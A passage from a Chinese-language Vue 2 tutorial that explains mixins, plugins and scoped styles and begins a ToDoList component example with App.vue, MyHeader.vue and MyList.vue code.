<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;click&lt;/button&gt;</span><br><span class="line">        &lt;h2&gt;&#123;&#123;x&#125;&#125; - &#123;&#123;y&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import &#123;mixin1 ,mixin2&#125; from &#x27;../mixin/mixin&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;MySchool&#x27;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        mixins: [</span><br><span class="line">            mixin1,</span><br><span class="line">            mixin2</span><br><span class="line">        ],</span><br><span class="line">        mounted() &#123;</span><br><span class="line">            console.log(this.x)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>组件中的<code>data</code>多了<code>mixin</code>中定义的数据</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220527065551713.png" alt="image-20220527065551713"></p>
<p>如果<code>mixin</code>中和组件的<code>data</code>中，含有相同的数据变量，以组件的优先，<code>methods</code>配置项也是</p>
<p>但是，生命周期钩子，不以任何人为主，都会执行</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin1 = &#123;</span><br><span class="line">    <span class="attr">methods</span>: &#123;</span><br><span class="line">        <span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">name</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mixin1 mounted&#x27;</span>) <span class="comment">// 混合中的钩子会先执行，并按照引入先后依此执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> mixin2 = &#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">x</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">y</span>: <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mixin2 mounted&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h2&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span><br><span class="line">        &lt;button @click=&quot;showName&quot;&gt;click&lt;/button&gt;</span><br><span class="line">        &lt;h2&gt;&#123;&#123;x&#125;&#125; - &#123;&#123;y&#125;&#125;&lt;/h2&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import &#123;mixin1 ,mixin2&#125; from &#x27;../mixin/mixin&#x27;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;MySchool&#x27;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                name: &#x27;sai&#x27;,</span><br><span class="line">                x: 666</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        mixins: [</span><br><span class="line">            mixin1,</span><br><span class="line">            mixin2</span><br><span class="line">        ],</span><br><span class="line">        mounted() &#123;</span><br><span class="line">            console.log(&#x27;School mounted&#x27;) // 组件中的生命周期钩子会后执行</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220527070626058.png" alt="image-20220527070626058"></p>
<h3 id="3-8-3-全局混入"><a href="#3-8-3-全局混入" class="headerlink" title="3.8.3.全局混入"></a>3.8.3.全局混入</h3><p>利用<code>Vue.mixin(options)</code>方法，在<code>main.js</code>中引入，作为全局混入，使用时所有的组件中都可以使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;mixin1, mixin2&#125; <span class="keyword">from</span> <span class="string">&#x27;./mixin/mixin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(mixin1)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(mixin2)</span><br></pre></td></tr></table></figure>

<p>备注：如果<code>main.js</code>用<code>createApp</code>方法替代<code>new Vue</code>的操作了，上面的写法会提示<code>Vue</code>不存在，写法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>全局混入后，<code>vm</code>根实例和所有的组件实例对象，都有<code>mixin</code>中配置的<code>data</code>配置项或其他配置项</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220527135656752.png" alt="image-20220527135656752"></p>
<h3 id="3-8-4-小结：mixin"><a href="#3-8-4-小结：mixin" class="headerlink" title="3.8.4.小结：mixin"></a>3.8.4.小结：<code>mixin</code></h3><p><code>mixin</code>混入</p>
<ul>
<li><p>功能：可以把多个组件共有的配置提取成一个混入对象</p>
</li>
<li><p>使用方式</p>
<ul>
<li><p>第一步，定义混合</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">    <span class="attr">methods</span>: &#123;&#125;,</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二步，使用混合</p>
<ul>
<li><p>局部混入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;xxx&#125; <span class="keyword">from</span> <span class="string">&#x27;./mixin&#x27;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 配置项</span></span><br><span class="line"><span class="attr">mixins</span>: [xxx]</span><br></pre></td></tr></table></figure>
</li>
<li><p>全局混入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;xxx&#125; <span class="keyword">from</span> <span class="string">&#x27;./mixin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">mixin</span>(xxx)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-9-插件"><a href="#3-9-插件" class="headerlink" title="3.9.插件"></a>3.9.插件</h2><p>插件本质是一个对象，但是这个对象要包含<code>install</code>方法</p>
<p>新建<code>plugins.js</code>定义并暴露该对象</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">install</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;install&#x27;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main.js</code>中引入插件，并使用<code>Vue</code>提供的<code>use</code>方法，使用定义好的插件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> plugins <span class="keyword">from</span> <span class="string">&#x27;./plugins&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(plugins) <span class="comment">//使用插件，此时vue会帮我们调用install方法</span></span><br></pre></td></tr></table></figure>

<p>那有啥用咧</p>
<p><code>install</code>方法被调用时，可以接受一个参数，这个参数是<code>vm</code>的构造函数<code>Vue</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">install</span>(<span class="params">Vue</span>) &#123;</span><br><span class="line">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;install&#x27;</span>, <span class="title class_">Vue</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220527141319725.png" alt="image-20220527141319725"></p>
<p>结合我们之前讲过的<code>Vue</code>身上的方法，能做很多事情</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">	<span class="title function_">install</span>(<span class="params">Vue</span>) &#123;</span><br><span class="line">        <span class="comment">// 定义全局过滤器</span></span><br><span class="line">		<span class="title class_">Vue</span>.<span class="title function_">filter</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义全局自定义指令</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">directive</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义全局混入</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">mixin</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 往原型上添加方法，`vm`和`vc`就都可以使用</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>小结：插件</p>
<ul>
<li><p>功能：用于增强<code>Vue</code></p>
</li>
<li><p>本质：包含一个<code>install</code>方法的对象</p>
<ul>
<li><code>install</code>方法的第一个参数是<code>Vue</code>，第二个及以后的参数是插件使用者传递的数据</li>
</ul>
</li>
<li><p>定义插件：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span> <span class="keyword">default</span> = &#123;</span><br><span class="line">	<span class="title function_">install</span>(<span class="params">Vue, options</span>) &#123;</span><br><span class="line">		<span class="title class_">Vue</span>.<span class="title function_">filter</span>(...) <span class="comment">// 定义全局过滤器</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">directive</span>(...) <span class="comment">// 定义全局自定义指令</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">mixin</span>(...) <span class="comment">// 定义全局混入</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$myMethod</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;...&#125; <span class="comment">// 添加实例方法和属性，`vm`和`vc`就都可以使用</span></span><br><span class="line">        <span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$myProperty</span> = xxx</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用插件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> plugins <span class="keyword">from</span> <span class="string">&#x27;./plugins&#x27;</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(plugins) <span class="comment">// 使用者可以添加参数</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-10-scoped样式"><a href="#3-10-scoped样式" class="headerlink" title="3.10.scoped样式"></a>3.10.<code>scoped</code>样式</h2><p>如果<code>style</code>标签中，没有<code>scoped</code>属性，最终所有的样式会汇总到一起，容易出现类名冲突，后引入的组件中的样式会覆盖先引入的样式。</p>
<p>可以给<code>style</code>添加使用<code>scoped</code>属性，解决样式冲突的问题</p>
<ul>
<li><p>原理：有了<code>scoped</code>属性后，<code>vue</code>会给匹配到类名的<code>dom</code>节点添加自定义属性：<code>data-v-xxx</code>，然后使用<code>css</code>的属性标签选择器来匹配样式</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.demo</span><span class="selector-attr">[data-v-123]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="string">&#x27;blue&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.demo</span><span class="selector-attr">[data-v-456]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="string">&#x27;yellow&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>App</code>组件一般不加</p>
</li>
<li><p>也可以使用<code>css</code>预编译语言来编写样式，但是要先安装<code>less-loader</code></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style lang=&quot;less&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>问题：可能会出现版本不兼容的问题</p>
<ul>
<li>此时自己下载的<code>vue-cli</code>，用到<code>webpack</code>的版本为<code>5</code>版本（<code>node_modules</code>文件夹找<code>webapck</code>文件夹，查看<code>package.json</code>文件），这个时候装<code>less-loader</code>是没有问题的，因为默认安装的是最新版的<code>less-loader</code>，新版本是为了迎合<code>webpakc5</code></li>
<li>如果<code>vue-cli</code>用的<code>webpack</code>为<code>4</code>版本，则要<code>less-loader</code>版本降级以兼容<code>webpack4</code><ul>
<li>查看所有版本：<code>npm view less-loader versions</code></li>
<li>试一下不那么新的版本：<code>npm i less-loader@7.0.0 -D</code> <ul>
<li><code>8</code>及以上的版本就是为<code>webpack4</code>服务的了</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>小结：<code>scoped</code>样式</p>
<ul>
<li>作用：让样式在局部生效，防止冲突</li>
<li>写法：<code>&lt;style scoped&gt;</code></li>
</ul>
<h2 id="3-11-组件化编码流程"><a href="#3-11-组件化编码流程" class="headerlink" title="3.11.组件化编码流程"></a>3.11.组件化编码流程</h2><ul>
<li><p>实现静态组件：抽取组件，使用组件实现静态效果</p>
<ul>
<li>一般需要自己写静态页面</li>
<li>也有可能，静态页面别人已经写好了，然后拿过来自己拆成组件</li>
<li>一般组件名，最好是多个单词</li>
</ul>
</li>
<li><p>展示动态数据</p>
<ul>
<li><p>确定数据保存在哪个组件</p>
</li>
<li><p>数据的类型、名称是什么</p>
</li>
</ul>
</li>
<li><p>交互</p>
<ul>
<li><p>组件之间的数据传递前的预定义</p>
<ul>
<li>父传子，可以传<code>data</code>和<code>method</code><ul>
<li><code>data</code></li>
<li><code>method</code>，子组件调用传过来方法时，如果传入了参数，父组件也是可以收到的</li>
</ul>
</li>
</ul>
</li>
<li><p>绑定事件监听，并进行业务交互逻辑编写，并对异常情况进行处理</p>
</li>
</ul>
</li>
</ul>
<h3 id="3-11-1ToDOList案例"><a href="#3-11-1ToDOList案例" class="headerlink" title="3.11.1ToDOList案例"></a>3.11.1<code>ToDOList</code>案例</h3><h4 id="3-11-1-1-编写静态组件"><a href="#3-11-1-1-编写静态组件" class="headerlink" title="3.11.1.1.编写静态组件"></a>3.11.1.1.编写静态组件</h4><h5 id="App-vue"><a href="#App-vue" class="headerlink" title="App.vue"></a><code>App.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;todo-container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;todo-wrap&quot;&gt;</span><br><span class="line">        &lt;MyHeader&gt;&lt;/MyHeader&gt;</span><br><span class="line">        &lt;MyList&gt;&lt;/MyList&gt;</span><br><span class="line">        &lt;MyFooter&gt;&lt;/MyFooter&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyHeader from &#x27;./components/MyHeader.vue&#x27;</span><br><span class="line">    import MyList from &#x27;./components/MyList.vue&#x27;</span><br><span class="line">    import MyFooter from &#x27;./components/MyFooter.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyHeader,</span><br><span class="line">            MyList,</span><br><span class="line">            MyFooter</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;less&quot;&gt;</span><br><span class="line">  #root &#123;</span><br><span class="line">    @color-white: white;</span><br><span class="line">    @color-danger: #bd362f;</span><br><span class="line">    @color-grey-d: #ddd;</span><br><span class="line">    @display: display;</span><br><span class="line">    @selector: .btn;</span><br><span class="line"></span><br><span class="line">    background-color: @color-white;</span><br><span class="line"></span><br><span class="line">    .todo-container &#123;</span><br><span class="line">      width: 600px;</span><br><span class="line">      margin: 0 auto;</span><br><span class="line"></span><br><span class="line">      .todo-wrap &#123;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        border: 1px solid @color-grey-d;</span><br><span class="line">        border-radius: 5px;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @&#123;selector&#125; &#123;</span><br><span class="line">        @&#123;display&#125;: inline-block;</span><br><span class="line"></span><br><span class="line">      padding: 4px 12px;</span><br><span class="line">      margin-bottom: 0;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      line-height: 20px;</span><br><span class="line">      text-align: center;</span><br><span class="line">      vertical-align: middle;</span><br><span class="line">      cursor: pointer;</span><br><span class="line">      box-shadow: inset 0 1px rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);</span><br><span class="line">      border-radius: 4px;</span><br><span class="line"></span><br><span class="line">      &amp;:focus &#123;</span><br><span class="line">        outline: none;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .btn-danger &#123;</span><br><span class="line">      color: @color-white;</span><br><span class="line">      background-color: @color-danger;</span><br><span class="line"></span><br><span class="line">      &amp;:hover &#123;</span><br><span class="line">        color: @color-white;</span><br><span class="line">        background-color: @color-danger;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="MyHeader-vue"><a href="#MyHeader-vue" class="headerlink" title="MyHeader.vue"></a><code>MyHeader.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;todo-header&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; placeholder=&quot;请输入任务名称，回车键确认&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyHeader&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  .todo-header &#123;</span><br><span class="line">    @color-grey-c: #ccc;</span><br><span class="line">    @color-blue: rgba(82, 168, 236, 0.8);</span><br><span class="line"></span><br><span class="line">    input &#123;</span><br><span class="line">      width: 560px;</span><br><span class="line">      height: 28px;</span><br><span class="line">      border: 1px solid @color-grey-c;</span><br><span class="line">      border-radius: 4px;</span><br><span class="line">      padding: 4px 7px;</span><br><span class="line">      font-size: 14px;</span><br><span class="line"></span><br><span class="line">      &amp;:focus &#123;</span><br><span class="line">        outline: none;</span><br><span class="line">        border-color: @color-blue;</span><br><span class="line">        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px @color-blue;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<h5 id="MyList-vue"><a href="#MyList-vue" class="headerlink" title="MyList.vue"></a><code>MyList.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ul class=&quot;todo-main&quot;&gt;</span><br><span class="line">    &lt;MyItem&gt;&lt;/MyItem&gt;</span><br><span class="line">    &lt;MyItem&gt;&lt;/MyItem&gt;</span><br><span class="line">    &lt;MyItem&gt;&lt;/MyItem&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyItem from &#x27;./MyItem.vue&#x27;</span><br><span class="line"></span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyList&quot;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyItem</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;less&quot;&gt;</span><br><span class="line">  @color-grey-d: #ddd;</span><br><span class="line"></span><br><span class="line">  .todo-main &#123;</span><br><span class="line">    margin-left: 0;</span><br><span class="line">    border: 1px solid @color-grey-d;</span><br><span class="line">    padding: 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .todo-empty &#123;</span><br><span class="line">    height: 40px;</span><br><span class="line">    line-height: 